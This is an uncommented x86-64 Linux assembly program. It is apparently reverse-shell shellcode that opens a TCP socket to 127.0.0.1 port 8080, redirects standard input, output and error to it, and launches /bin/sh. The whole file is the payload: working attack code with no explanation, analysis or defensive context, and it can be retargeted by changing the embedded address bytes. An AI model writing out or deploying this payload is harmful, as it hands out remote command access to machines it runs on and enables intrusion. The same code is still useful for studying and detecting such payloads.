section .text
    global _start

_start:
    jmp get_vars

main:
    pop rbp

    mov rax, 9
    mov rdi, 0
    mov rsi, 8
    mov rdx, 3
    mov r10, 34
    mov r8, -1
    mov r9, 0
    syscall

    mov r12, rax
    
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall

    mov qword [r12] , rax

    mov rax, 42
    mov rdi, [r12]
    mov rsi, rbp
    mov rdx, address_len
    syscall

    mov rax, 33
    mov rdi, [r12]
    mov rsi, 1
    syscall

    mov rax, 33
    mov rdi, [r12]
    mov rsi, 0
    syscall

    mov rax, 33
    mov rdi, [r12]
    mov rsi, 2
    syscall

    mov rax, 59
    lea rdi, [rbp + 16]
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rax, 60
    mov rdi, 0
    syscall

get_vars:
    call main
    address:
        dw 2
        dw 0x901F
        dd 0x0100007F
        dq 0

    address_len equ $ - address

    shell db "/bin/sh", 0
    
    